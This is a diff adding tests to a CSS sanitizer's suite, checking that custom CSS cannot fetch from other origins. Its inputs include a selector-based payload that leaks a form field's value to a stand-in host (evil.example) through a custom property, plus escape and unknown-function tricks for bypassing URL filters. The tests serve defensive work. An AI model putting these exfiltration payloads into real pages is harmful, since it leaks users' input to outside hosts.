@@ -235,6 +235,61 @@ describe("custom CSS may not reach off this origin", () => {
     }
   });
 
+  it("reads a URL hidden in a custom property", () => {
+    // A custom property holds an arbitrary token stream, so css-tree gives its
+    // value as `Raw` and a walk over the parsed value sees nothing inside it.
+    // The URL still fetches the moment anything says `var(--probe)`.
+    const out = sanitizeCustomCss(
+      `input[value^="a"] { --probe: url("https://evil.example/a"); background: var(--probe) }`,
+      SCOPE
+    );
+    expect(out.css).not.toContain("evil.example");
+    expect(out.warnings.map(w => w.code)).toContain("remote-url");
+    // The same reach, through a function rather than url().
+    expect(
+      sanitizeCustomCss(
+        `.a { --x: image-set("https://evil.example/a" 1x) }`,
+        SCOPE
+      ).css
+    ).not.toContain("evil.example");
+  });
+
+  it("removes the whitespace a URL parser removes", () => {
+    // Tab and newline are stripped OUT of a URL by the parser, so `h<TAB>ttps:`
+    // is fetched as `https:` while matching no scheme pattern.
+    for (const escape of ["\\9 ", "\\a "]) {
+      const out = sanitizeCustomCss(
+        `.a { background: url("h${escape}ttps://evil.example/a") }`,
+        SCOPE
+      );
+      expect(out.css).not.toContain("evil.example");
+      expect(out.warnings.map(w => w.code)).toContain("remote-url");
+    }
+  });
+
+  it("treats an unclassified function as able to fetch", () => {
+    // The allowlist names the functions whose strings are TEXT. Anything else
+    // is checked, so a function nobody has classified fails closed rather than
+    // opening the channel by being new.
+    const out = sanitizeCustomCss(
+      `.a { background: some-future-fn("https://evil.example/a") }`,
+      SCOPE
+    );
+    expect(out.css).not.toContain("evil.example");
+  });
+
+  it("leaves a textual fallback alone", () => {
+    // The other side of that allowlist. `attr()` and `counter()` take text, and
+    // telling an author to upload a file because their caption looks like a URL
+    // is a real cost for no security gain.
+    for (const css of [
+      `.a { content: attr(data-label, "https://example.com") }`,
+      `.a { content: counter(x, "https://example.com") }`,
+    ]) {
+      expect(sanitizeCustomCss(css, SCOPE).warnings).toEqual([]);
+    }
+  });
+
   it("keeps the paths that resolve against this site", () => {
     for (const url of ["/media/hero.png", "./hero.png", "hero.png", "#frag"]) {
       const out = sanitizeCustomCss(`.a { background: url("${url}") }`, SCOPE);
